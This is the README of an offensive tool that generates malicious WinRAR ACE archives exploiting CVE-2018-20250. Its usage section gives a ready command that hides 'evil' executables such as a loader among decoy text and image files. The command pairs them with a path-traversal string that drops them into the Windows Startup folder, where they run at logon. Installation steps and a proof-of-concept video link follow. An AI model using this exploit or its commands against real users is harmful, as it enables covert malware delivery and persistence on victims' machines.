# Evil-WinRAR-Generator
[![Python 3.6](https://img.shields.io/badge/python-3.6-yellow.svg)](https://www.python.org/downloads/release/python-360/)
 [![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://raw.githubusercontent.com/master/LICENSE) [![facebook](https://img.shields.io/badge/twitter-@manulqwerty-blue.svg)](https://twitter.com/manulqwerty) 

Generator of malicious Ace files for WinRAR &lt; 5.70 beta 1

Vulnerability by [research.checkpoint.com](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

**Developed by [@manulqwerty - IronHackers](https://ironhackers.es).**

Usage
----
Help:

`./evilWinRAR.py -h`

Generate a malicius archive:
> Rar filename: evil.rar

> Evil path: C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

> Evil files: calc.exe , l04d3r.exe

> Good files: hello.txt , cats.jpeg
```bash
./evilWinRAR.py -o evil.rar -e calc.exe l04d3r.exe -g hello.txt cats.jpeg -p 'C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
```

Instalation
----
You can download Evil-WinRAR-Generator by cloning the [Git](https://github.com/manulqwerty/Evil-WinRAR-Gen.git) repository:
	
```bash
git clone https://github.com/manulqwerty/Evil-WinRAR-Gen.git
cd Evil-WinRAR-Gen && pip3 install -r requirements.txt
chmod +x evilWinRAR.py
```
	
Evil-WinRAR-Generator works out of the box with [Python](http://www.python.org/download/) version **3.x** on any platform.

Proof of Concept (CVE-2018-20250)
----
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/eUsVHa_fxrA/0.jpg)](https://www.youtube.com/watch?v=eUsVHa_fxrA)

Screenshots
----
![Screenshot](https://ironhackers.es/wp-content/uploads/2019/02/2-4.png)
![Screenshot](https://ironhackers.es/wp-content/uploads/2019/02/1-4.png)

Credits
----
https://github.com/droe/acefile

https://github.com/WyAtu/CVE-2018-20250

**Colaborators:**

[cybervaca]

<!-- Github URLs -->
[cybervaca]: https://github.com/cybervaca
